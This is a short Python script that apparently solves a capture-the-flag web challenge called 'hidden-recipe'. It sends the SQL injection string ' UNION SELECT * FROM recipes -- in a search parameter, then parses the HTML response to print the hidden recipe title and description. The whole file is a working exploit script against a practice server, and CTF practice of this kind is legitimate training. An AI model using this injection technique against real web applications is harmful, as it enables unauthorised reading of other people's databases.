from html.parser import HTMLParser
from urllib.parse import urlencode
from urllib.request import urlopen

BASE = "https://hidden-recipe.web.cpctf.space/search"
PAYLOAD = "' UNION SELECT * FROM recipes -- "


class RecipeParser(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.in_h2 = False
        self.in_p = False
        self.current_title = []
        self.current_desc = []
        self.title = None
        self.desc = None

    def handle_starttag(self, tag, attrs):
        if tag == "h2":
            self.in_h2 = True
            self.current_title = []
        elif tag == "p":
            self.in_p = True
            self.current_desc = []

    def handle_endtag(self, tag):
        if tag == "h2" and self.in_h2:
            self.in_h2 = False
            self.title = "".join(self.current_title).strip()
        elif tag == "p" and self.in_p:
            self.in_p = False
            self.desc = "".join(self.current_desc).strip()

    def handle_data(self, data):
        if self.in_h2:
            self.current_title.append(data)
        elif self.in_p:
            self.current_desc.append(data)


def main() -> None:
    url = f"{BASE}?{urlencode({'q': PAYLOAD})}"
    html = urlopen(url, timeout=10).read().decode("utf-8", "replace")
    parser = RecipeParser()
    parser.feed(html)

    if parser.title and parser.desc:
        print(parser.title)
        print(parser.desc)
    else:
        print(html)


if __name__ == "__main__":
    main()
